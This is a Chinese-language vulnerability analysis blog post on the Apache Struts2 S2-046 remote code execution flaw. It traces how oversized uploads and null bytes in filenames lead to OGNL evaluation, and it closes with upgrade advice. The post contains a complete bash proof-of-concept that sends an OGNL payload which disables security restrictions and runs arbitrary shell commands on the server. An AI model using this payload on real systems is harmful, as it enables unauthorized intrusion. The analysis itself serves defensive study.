---
layout:     post
title:      "Apache Struts2 Remote Code Execution (S2-046) "
date:       2017-03-22
categories: [Java, Code Audit]

---

### Versions Affected

```
Struts 2.3.5 – Struts 2.3.31
Struts 2.5 – Struts 2.5.10
And you are using Jakarta based file upload Multipart parser
```

### Description

s2-046这个漏洞其实和s2-045漏洞触发的本质是一样的，都使用了同一个异常处理方法，且异常信息中含有ognl表达式导致命令执行，而不同的则是触发异常的点不同而已，s2-045的异常触发是由于content-type中存在无法解析的内容，而s2-046则由content-length过大和上传文件名不合规造成，接下来我们分别对这两种情况进行分析。

### Vulnerability Analysis

首先我们再回顾一下关于[s2-045](http://reverse-tcp.xyz/2017/03/08/Apache-Struts2-remote-code-execution-(s2-045)/)的分析，**MultiPartRequestWrapper.java**中使用了解析函数对上传请求进行了解析，而**JakartaMultiPartRequest.java** 中对该parse函数的定义如下：

```java
public void parse(HttpServletRequest request, String saveDir)
    throws IOException
  {
    try
    {
      setLocale(request);
      processUpload(request, saveDir); // 上传实现的调用
    }
    catch (FileUploadBase.SizeLimitExceededException e)
    {
      if (LOG.isWarnEnabled()) {
        LOG.warn("Request exceeded size limit!", e, new String[0]);
      }
      String errorMessage = buildErrorMessage(e, new Object[] { Long.valueOf(e.getPermittedSize()), Long.valueOf(e.getActualSize()) });
      if (!this.errors.contains(errorMessage)) {
        this.errors.add(errorMessage);
      }
    }
    catch (Exception e) // 捕获异常
    {
      if (LOG.isWarnEnabled()) {
        LOG.warn("Unable to parse request", e, new String[0]);
      }
      String errorMessage = buildErrorMessage(e, new Object[0]); 
      // 对捕获的异常进行处理
      if (!this.errors.contains(errorMessage)) {
        this.errors.add(errorMessage);
      }
    }
  }
```

这里我们看到该解析函数对于上传请求解析过程中所发生的异常都是使用了buildErrorMessage方法进行处理，在对于s2-045分析时我们已经知道在该方法中使用到了findtext，它是具备有执行ognl表达式能力的，所以不管如何，*只要上传解析过程中发生了异常，且异常信息中可以含有可控输入的ognl表达式，就可以达到命令执行的效果*。

------

#### **异常触发点一**

说到这个触发点的时候是老泪纵横的，s2-045漏洞爆出来后对漏洞进行分析时我是意识到以上所说的结论的，所以就去寻找了解析过程中哪里还有可能会触发异常，当然已经知道content-type处是可以的，那惯性思维去想想content-length也存在问题呢？所以就去分析了一下，也发现了content-length过大就会触发异常，但是content-length是int型的，传入ognl进去是没有任何作用的，也就想当然的然并卵了。直到s2-046爆出来后，惊奇的看到由于content-length过大触发异常，而ognl通过Content-Disposition中的filename传入的（一脸懵逼状），而且struts.multipart.parser需要配置为jakarta-stream才可以，所以就去分析一下**JakartaStreamMultiPartRequest.java**中的parse函数

```java
public void parse(HttpServletRequest request, String saveDir)
    throws IOException
  {
    try
    {
      setLocale(request);
      processUpload(request, saveDir); //上传实现的调用
    }
    catch (Exception e) //异常捕获
    {
      e.printStackTrace();
      String errorMessage = buildErrorMessage(e, new Object[0]);
      // 同样使用buildErrorMessage对异常进行处理
      if (!this.errors.contains(errorMessage)) {
        this.errors.add(errorMessage);
      }
    }
  }
```

和之前s2-046的分析一样，我们继续跟进processUpload分析

```java
private void processUpload(HttpServletRequest request, String saveDir)
    throws Exception
  {
    if (ServletFileUpload.isMultipartContent(request))
    {
      boolean requestSizePermitted = isRequestSizePermitted(request);
      // 此处判断文件大小
      ServletFileUpload servletFileUpload = new ServletFileUpload();
      FileItemIterator i = servletFileUpload.getItemIterator(request);
      while (i.hasNext()) {
        try
        {
          FileItemStream itemStream = i.next();
          if (itemStream.isFormField())
          {
            processFileItemStreamAsFormField(itemStream);
          }
          else
          {
            if (!requestSizePermitted)
            {
              addFileSkippedError(itemStream.getName(), request);
              LOG.warn("Skipped stream '#0', request maximum size (#1) exceeded.", new Object[] { itemStream.getName(), this.maxSize });
              // if判断如果文件大小不满足要求，则调用addFileSkippedError函数
              continue;
            }
            processFileItemStreamAsFileField(itemStream, saveDir);
          }
        }
        catch (IOException e)
        {
          e.printStackTrace();
        }
      }
    }
  }
```

看到这里就可以发现isRequestSizePermitted判断文件大小，如果文件过大就会调用addFileSkippedError函数

我们首先跟进isRequestSizePermitted看看是如何进行文件大小判断的

```java
private boolean isRequestSizePermitted(HttpServletRequest request)
  {
    if ((this.maxSize.longValue() == -1L) || (request == null)) {
      return true;
    }
    return request.getContentLength() < this.maxSize.longValue();
    // 判断 ContentLength 是否小于 maxSize
  }
```

而default.properties中默认配置的大小为2097152，即2M，这个配置是可以改的，所以写poc的时候content-length还是尽可能写大一些吧

```properties
### Parser to handle HTTP POST requests, encoded using the MIME-type multipart/form-data
# struts.multipart.parser=cos
# struts.multipart.parser=pell
struts.multipart.parser=jakarta-stream
# struts.multipart.parser=jakarta 
# uses javax.servlet.context.tempdir by default
struts.multipart.saveDir=
struts.multipart.maxSize=2097152
```

分析至此异常的触发原理已明了，那么根据我们最早的结论，异常中必须得含有可控的内容才能传入ognl表达式完成漏洞利用，所以我们再返回去分析判断文件大小Content-length大于maxSize时调用的addFileSkippedError

```java
private void addFileSkippedError(String fileName, HttpServletRequest request)
  {
    String exceptionMessage = "Skipped file " + fileName + "; request size limit exceeded.";
    // 此处将上传文件名filename拼接在了异常信息里
    FileUploadBase.FileSizeLimitExceededException exception = new FileUploadBase.FileSizeLimitExceededException(exceptionMessage, getRequestSize(request), this.maxSize.longValue());
    String message = buildErrorMessage(exception, new Object[] { fileName, Long.valueOf(getRequestSize(request)), this.maxSize });
    // buildErrorMessage处理异常
    if (!this.errors.contains(message)) {
      this.errors.add(message);
    }
  }
```

这里在处理异常信息时首先进行把上传文件名filename放到了异常信息里了，而filename我们是可控的，只要在filename里插入ognl表达式即可完成攻击操作。。。。

GG啊！自己还是太年轻，对框架学习的不够，也不够细心，唉～

------

#### **漏洞触发点二**

除了通过Content-length来触发漏洞外，漏洞爆发后还发现如下这样的一个POC，并没有设置Content-length属性，但却还是在filename中插入了ognl表达式，而且该POC可以成功利用漏洞

```sh
#!/bin/bash

url=$1
cmd=$2
shift
shift

boundary="---------------------------735323031399963166993862150"
content_type="multipart/form-data; boundary=$boundary"
payload=$(echo "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$cmd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")

printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@
```

仔细对比上一个触发点POC中的filname内容可以发现该POC中filename传入ognl payload后还跟了一个**“\0b”**字符串，也就是空字符加了一个任意字符

我们继续回到processUpload进行分析，如果if判断文件大小符合要求则不会进入if代码块，程序顺序执行至**processFileItemStreamAsFileField**函数

```java
if (!requestSizePermitted)
{
  addFileSkippedError(itemStream.getName(), request);
  LOG.warn("Skipped stream '#0', request maximum size (#1) exceeded.", new Object[] { itemStream.getName(), this.maxSize });
  continue;
}
processFileItemStreamAsFileField(itemStream, saveDir); 
// 程序顺序执行至此
```

我们继续跟进processFileItemStreamAsFileField函数，分析该函数的功能

```java
private void processFileItemStreamAsFileField(FileItemStream itemStream, String location)
  {
    File file = null;
    try
    {
      file = createTemporaryFile(itemStream.getName(), location);
      // 这里调用了commons-fileupload-1.3.1.jar
      
      if (streamFileToDisk(itemStream, file)) {
        createFileInfoFromItemStream(itemStream, file);
      }
    }
    catch (IOException e)
    {
      if (file != null) {
        try
        {
          file.delete();
        }
        catch (SecurityException se)
        {
          se.printStackTrace();
          LOG.warn("Failed to delete '#0' due to security exception above.", new String[] { file.getName() });
        }
      }
    }
  }
```

getName()定义在第三方commons-fileupload-1.3.1.jar包中的DiskFileItem.java文件中

```java
public String getName()
{
  return Streams.checkFileName(this.fileName);
}
```

这里又继续调用了checkFileName，跟进分析

```java
public static String checkFileName(String fileName)
  {
    if ((fileName != null) && (fileName.indexOf(0) != -1))
    {
      StringBuilder sb = new StringBuilder();
      for (int i = 0; i < fileName.length(); i++)
      {
        char c = fileName.charAt(i);
        switch (c)
        {
        case '\000': 
          sb.append("\\0");
          break;
        default: 
          sb.append(c);
        }
      }
      throw new InvalidFileNameException(fileName, "Invalid file name: " + sb);
      // filename传入到了异常信息中
    }
    return fileName;
  }
}
```

这里首先判断文件名是否为null，当文件名中包含空字符时就会抛出异常，异常信息中会带入filename字段，而JakartaStreamMultiPartRequest.java的parse函数中的buildErrorMessage会对异常进行处理，所以也就知道了在构造POC的时候filename中传入ognl表达式并含有空字符即可。

不得不吐槽一下struts2在处理上传这块的问题真多，buildErrorMessage无处不在啊，只要有个异常都会是他来处理，懵逼呢～

------

### Solution

直接使用最新版struts2的jar包替换原jar文件进行升级，有三个包必须要升级（升级前备份原版本jar包）：

- Struts2-core-2.3.32.jar：struts2核心包，也是此漏洞发生的所在；
- xwork-core-2.3.32.jar：struts2依赖包，版本跟随struts2一起更新；
- ongl-3.0.19.jar：用于支持ognl表达式，为其他包提供依赖；
- commons-fileupload-1.3.2.jar：用于处理文件上传；

建议先在测试环境进行升级测试，查看是否会影响业务正常运行。





